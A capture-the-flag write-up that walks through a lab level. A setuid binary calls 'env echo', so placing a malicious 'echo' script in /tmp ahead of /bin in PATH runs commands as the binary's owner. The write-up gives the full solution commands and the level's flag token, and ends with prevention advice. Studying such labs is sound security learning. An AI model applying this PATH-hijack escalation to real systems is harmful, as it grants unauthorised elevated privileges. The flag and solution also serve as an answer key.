# Level 03 - PATH Environment Variable Hijacking

## Objective
Exploit a setuid binary to execute commands as `flag03`.

## My Notes

Found a setuid binary in the home directory:
```bash
ls -la
# -rwsr-sr-x 1 flag03 level03 8627 level03
```

The `s` in user and group permissions means SUID and SGID bits are set. When executed, this runs with flag03's privileges, not mine.

Ran it:
```bash
./level03
# Output: Exploit me
```

Used `strings` to see what it does:
```bash
strings level03
# /usr/bin/env echo Exploit me
```

Interesting - it uses `/usr/bin/env echo` instead of `/bin/echo`. The `env` command searches for programs in the PATH environment variable. This is the vulnerability.

The execution flow:
1. Binary calls `system("/usr/bin/env echo Exploit me")`
2. `env` searches PATH for 'echo'
3. Normally finds `/bin/echo`
4. But if I control PATH, I can make it find MY echo first

Created a malicious echo script:
```bash
cd /tmp
echo '#!/bin/bash' > echo
echo 'getflag' >> echo
chmod +x echo
```

Modified PATH to put `/tmp` first:
```bash
export PATH=/tmp:$PATH
```

Now when the binary runs, `env` searches PATH:
1. Checks `/tmp` first → finds my malicious echo
2. Runs my script with flag03's privileges
3. getflag executes as flag03

```bash
~/level03
# Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Solution
```bash
cd /tmp
echo '#!/bin/bash' > echo
echo 'getflag' >> echo
chmod +x echo
export PATH=/tmp:$PATH
~/level03
```

Token: `qi0maab88jeaj46qoumi7maus`

## Key Takeaways

**SUID/SGID bits:** Set User ID bit (4000) makes a program run as the file owner. Set Group ID (2000) runs as file group. Dangerous because they run with elevated privileges regardless of who executes them.

**PATH environment variable:** Tells the shell where to find executables. Searched in order, first match wins. If user controls PATH, they can redirect program lookups to malicious versions.

**env vs direct paths:** Using `/usr/bin/env program` makes the program search PATH, which is vulnerable to PATH manipulation. Using `/bin/program` directly is safer because it doesn't use PATH.

**Attack pattern:** Create malicious script with same name as target command, place in writable directory, modify PATH to search that directory first, execute vulnerable SUID program. Your script runs with elevated privileges.

## Tools Used
- `strings` - Extract readable text from binary
- `ltrace` - Shows system() calls (useful for debugging)
- `echo`, `chmod`, `export` - Create exploit

## Prevention
- Use absolute paths in SUID programs (`/bin/echo` not `echo`)
- Clear/sanitize PATH before executing: `setenv("PATH", "/bin:/usr/bin", 1)`
- Avoid system() - use exec() family with full paths
- Minimize SUID programs
